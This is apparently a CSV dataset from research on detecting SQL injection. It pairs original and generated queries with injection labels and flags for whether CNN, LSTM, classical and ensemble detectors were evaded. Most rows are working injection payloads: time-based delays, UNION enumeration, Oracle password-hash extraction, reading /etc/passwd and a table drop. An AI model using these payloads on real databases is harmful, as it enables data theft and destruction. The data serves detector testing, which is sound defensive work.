,original_query,generated_query,validity,is_sql_injection,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
11608,""")) or sleep(__TIME__)=""",""")) or sleep(__TIME__)=""",1,1,0,0,0,0,0
11609,"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4",1,1,1,0,0,0,0
11610,1)) or sleep(__TIME__)#,1)) or sleep(__TIME__)#,0,1,0,0,0,0,0
11611,",NULL)%20waitfor%20delay%20'0:0:20'%20/*",",NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,1,0,0,0,0,0
11612,' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i,' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i,1,1,0,0,0,0,0
11613,"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19","UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19",1,1,1,1,0,1,0
11614,""" or isNULL(1/0) /*",""" or isNULL(1/0) /*",0,1,0,0,0,0,0
11615,"',NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*","',NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,1,0,0,0,0,0
11616,SELECT * FROM Users;,SELECT * FROM Users;,1,0,1,1,1,1,1
11617,'; execute immediate 'sel' || 'ect us' || 'er','; execute immediate 'sel' || 'ect us' || 'er',1,1,1,0,0,0,0
11618,waitfor delay '0:0:20' /*,waitfor delay '0:0:20' /*,1,1,0,1,0,0,0
11619,""",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*",""",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*",0,1,0,0,0,0,0
11620,')%20waitfor%20delay%20'0:0:20'%20--,')%20waitfor%20delay%20'0:0:20'%20--,1,1,0,0,0,0,0
11621,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10","ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10",1,1,0,0,0,0,0
11622,' ; drop table temp --,' ; drop table temp --,1,1,1,1,0,1,0
11623,SELECT * FROM Users;,SELECT * FROM Users;,1,0,1,1,1,1,1
11624,"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))","AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))",1,1,0,0,1,0,0
11625,INSERT INTO table,INSERT INTO table,1,0,1,1,0,1,0
11626,' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i,' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i,1,1,0,0,0,0,0
11627,'))%20waitfor%20delay%20'0:0:20'%20/*,'))%20waitfor%20delay%20'0:0:20'%20/*,1,1,0,0,0,0,0
11628,"SELECT column1, column2 FROM table1, table2 WHERE column2='value';","SELECT column1, column2 FROM table1, table2 WHERE column2='value';",1,0,1,1,1,1,1
11629,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23","+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23",0,1,0,0,0,0,0
11630,"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))","AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))",1,1,0,0,0,0,0
11631,SELECT COUNT(*) FROM game;,SELECT COUNT(*) FROM game;,1,0,1,1,1,1,1
11632,ORDER BY 1#,ORDER BY 1#,0,1,1,1,0,1,0
11633,sleep(__TIME__)#,sleep(__TIME__)#,0,1,0,0,0,0,0
11634,"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23","),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23",1,1,0,0,0,0,0
11635,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*","'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*",1,1,0,0,0,0,0
11636,INSERT INTO Documents WHERE ID=x,INSERT INTO Documents WHERE ID=x,1,0,1,1,1,1,1
11637,' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND 'i'='i,' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND 'i'='i,1,1,0,0,0,0,0
11638,"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15",1,1,1,0,0,0,0
11639,",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,1,0,0,0,0,0
11640,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12--","UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12--",1,1,1,0,0,0,0
11641,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=6)) AND 'i'='i","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=6)) AND 'i'='i",1,1,0,0,0,0,0
11642,"1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116","1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116",1,1,0,0,0,0,0
11643,INSERT INTO table,INSERT INTO table,1,0,1,1,0,1,0
11644,"'),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*","'),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,1,0,0,0,0,0
11645,SELECT * FROM Users;,SELECT * FROM Users;,1,0,1,1,1,1,1
11646,INSERT INTO table,INSERT INTO table,1,0,1,1,0,1,0
11647,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND 'i'='i","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND 'i'='i",1,1,0,0,0,0,0
11648,"""),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*","""),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",0,1,0,0,0,0,0
11649,SELECT * FROM Users;,SELECT * FROM Users;,1,0,1,1,1,1,1
11650,"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--",1,1,1,0,0,0,0
11651,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29","ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29",1,1,0,0,0,0,0
11652,"and 0=benchmark(3000000,MD5(1))%20--","and 0=benchmark(3000000,MD5(1))%20--",0,1,0,0,0,0,0
11653,"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23","+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23",0,1,0,0,0,0,0
11654,"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))","AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))",1,1,0,0,0,0,0
11655,"""),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--","""),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",0,1,0,0,0,0,0
11656,"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25","UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25",1,1,1,1,0,1,0
11657,"'),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*","'),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,1,0,0,0,0,0
11658,' union all select @@version--,' union all select @@version--,1,1,1,0,0,0,0
11659,"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*","+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*",0,1,0,0,0,0,0
11660,SELECT * FROM Users;,SELECT * FROM Users;,1,0,1,1,1,1,1
11661,"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))--","AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))--",1,1,0,0,0,0,0
11662,' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i,' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i,1,1,0,0,0,0,0
11663,ORDER BY SLEEP(5),ORDER BY SLEEP(5),0,1,1,1,0,1,0
11664,"1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;","1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;",0,1,0,0,0,0,0
11665,INSERT INTO table,INSERT INTO table,1,0,1,1,0,1,0
11666,')))) waitfor delay '0:0:20' /*,')))) waitfor delay '0:0:20' /*,1,1,0,0,0,0,0
11667,')))) waitfor delay '0:0:20' /*,')))) waitfor delay '0:0:20' /*,1,1,0,0,0,0,0
11668,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23","+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23",0,1,0,0,0,0,0
11669,1 or 1=1,1 or 1=1,0,1,0,0,0,0,0
11670,OR x=x--,OR x=x--,0,1,0,1,0,0,0
11671,or SLEEP(5)--,or SLEEP(5)--,0,1,0,0,0,0,0
11672,"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23","UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23",1,1,1,1,0,1,0
11673,"'; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --","'; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --",1,1,0,0,0,0,0
11674,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--","ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--",1,1,0,0,0,0,0
11675,' having 1=1--,' having 1=1--,1,1,0,0,0,0,0
11676,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--","+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--",0,1,0,0,0,0,0
11677,"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11",1,1,1,0,0,0,0
11678,' or '7659'='7659,' or '7659'='7659,1,1,0,0,0,0,0
11679,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*","""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*",0,1,0,0,0,0,0
11680,"1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116","1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116",1,1,0,0,0,0,0
11681,"benchmark(50000000,MD5(1))--","benchmark(50000000,MD5(1))--",0,1,0,0,1,0,0
11682,SELECT * FROM Customers ORDER BY Country;,SELECT * FROM Customers ORDER BY Country;,1,0,1,1,1,1,1
11683,"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10--","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10--",1,1,1,0,0,0,0
11684,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=5)) AND 'i'='i","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=5)) AND 'i'='i",1,1,0,0,0,0,0
11685,""")))) waitfor delay '0:0:20' --",""")))) waitfor delay '0:0:20' --",0,1,0,0,0,0,0
11686,(||6),(||6),0,1,0,0,0,0,0
11687,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=3)) AND 'i'='i","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=3)) AND 'i'='i",1,1,0,0,0,0,0
11688,SELECT COUNT(*) FROM game;,SELECT COUNT(*) FROM game;,1,0,1,1,1,1,1
11689,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*","+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*",0,1,0,0,0,0,0
11690,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28","UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28",1,1,1,0,0,0,0
11691,"')) and 0=benchmark(3000000,MD5(1))%20--","')) and 0=benchmark(3000000,MD5(1))%20--",1,1,0,0,0,0,0
11692,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=6)) AND 'i'='i","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=6)) AND 'i'='i",1,1,0,0,1,0,0
11693,"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#","UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#",1,1,1,1,0,1,0
11694,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17","UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17",1,1,1,0,0,0,0
11695,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=2)) AND 'i'='i","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=2)) AND 'i'='i",1,1,0,0,0,0,0
11696,"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14#","UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14#",1,1,1,1,0,1,0
11697,CREATE TABLE Employees,CREATE TABLE Employees,1,0,1,1,1,1,1
11698,' union (select @@version) --,' union (select @@version) --,1,1,1,0,0,0,0
11699,INSERT INTO table,INSERT INTO table,1,0,1,1,0,1,0
11700,"' union (select NULL, (select @@version)) --","' union (select NULL, (select @@version)) --",1,1,1,0,0,0,0
11701,)%20waitfor%20delay%20'0:0:20'%20--,)%20waitfor%20delay%20'0:0:20'%20--,1,1,0,0,0,0,0
11702,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--","+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",0,1,0,0,0,0,0
11703,""" or isNULL(1/0) /*",""" or isNULL(1/0) /*",0,1,0,0,0,0,0
11704,"))) and 0=benchmark(3000000,MD5(1))%20--","))) and 0=benchmark(3000000,MD5(1))%20--",0,1,0,0,0,0,0
11705,INSERT INTO Documents WHERE ID=x,INSERT INTO Documents WHERE ID=x,1,0,1,1,1,1,1
11706,"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25","UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25",1,1,1,1,0,1,0
11707,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22","ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22",1,1,0,0,0,0,0
11708,"' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --","' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --",1,1,1,0,0,0,0
11709,"SELECT column1, column2 FROM table1, table2 WHERE column2='value';","SELECT column1, column2 FROM table1, table2 WHERE column2='value';",1,0,1,1,1,1,1
11710,UNION ALL SELECT 1#,UNION ALL SELECT 1#,1,1,1,1,0,1,0
11711,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23","""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23",0,1,0,0,0,0,0
11712,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--","ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--",1,1,0,0,0,0,0
11713,SELECT * FROM Customers ORDER BY Country;,SELECT * FROM Customers ORDER BY Country;,1,0,1,1,1,1,1
11714,' AND 1=utl_inaddr.get_host_address((SELECT SYS.LOGIN_USER FROM DUAL)) AND 'i'='i,' AND 1=utl_inaddr.get_host_address((SELECT SYS.LOGIN_USER FROM DUAL)) AND 'i'='i,1,1,0,0,0,0,0
11715,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=8)) AND 'i'='i","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=8)) AND 'i'='i",1,1,0,0,1,0,0
11716,"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))#","AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))#",1,1,0,0,1,0,0
11717,CREATE TABLE Employees,CREATE TABLE Employees,1,0,1,1,1,1,1
11718,"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#","UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#",1,1,1,1,0,1,0
11719,')) or sleep(__TIME__)=',')) or sleep(__TIME__)=',1,1,0,0,0,0,0
11720,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*","""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*",0,1,0,0,0,0,0
11721,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12#","UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12#",1,1,1,0,0,0,0
11722,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17","ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17",1,1,0,0,0,0,0
11723,"SELECT column1, column2 FROM table1, table2 WHERE column2='value';","SELECT column1, column2 FROM table1, table2 WHERE column2='value';",1,0,1,1,1,1,1
11724,anything' or 'x'='x,anything' or 'x'='x,1,1,0,0,0,0,0
11725,' or '1'='1,' or '1'='1,1,1,0,0,0,0,0
11726,AS INJECTX WHERE 1=1 AND 1=1--,AS INJECTX WHERE 1=1 AND 1=1--,0,1,1,0,0,0,0
11727,' or '1'='1,' or '1'='1,1,1,0,0,0,0,0
11728,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=7)) AND 'i'='i","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=7)) AND 'i'='i",1,1,0,0,0,0,0
11729,""" and 0=benchmark(3000000,MD5(1))%20%23",""" and 0=benchmark(3000000,MD5(1))%20%23",0,1,0,0,0,0,0
11730,""") and 0=benchmark(3000000,MD5(1))%20--",""") and 0=benchmark(3000000,MD5(1))%20--",0,1,0,0,0,0,0
11731,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23","'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23",1,1,0,0,0,0,0
11732,OR 1=0#,OR 1=0#,0,1,1,0,0,0,0
11733,"SELECT column1, column2 FROM table1, table2 WHERE column2='value';","SELECT column1, column2 FROM table1, table2 WHERE column2='value';",1,0,1,1,1,1,1
11734,"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*","),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*",1,1,0,0,0,0,0
11735,"UNION ALL SELECT 1,2,3,4,5#","UNION ALL SELECT 1,2,3,4,5#",1,1,1,0,0,0,0
11736,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13#","UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13#",1,1,1,0,0,0,0
11737,"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--","UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",1,1,1,1,0,1,0
11738,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--","+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",0,1,0,0,0,0,0
11739,"'),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--","'),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,1,0,0,0,0,0
11740,"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))","AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))",1,1,0,0,0,0,0
11741,' union select,' union select,1,1,0,0,0,0,0
11742,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23","+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23",0,1,0,0,0,0,0
11743,"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#",1,1,1,0,0,0,0
11744,' or 'a'='a,' or 'a'='a,1,1,0,0,0,0,0
11745,CREATE TABLE Employees,CREATE TABLE Employees,1,0,1,1,1,1,1
11746,HAVING 1=0#,HAVING 1=0#,0,1,1,0,0,0,0
11747,"',NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--","',NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,1,0,0,0,0,0
11748,CREATE TABLE Employees,CREATE TABLE Employees,1,0,1,1,1,1,1
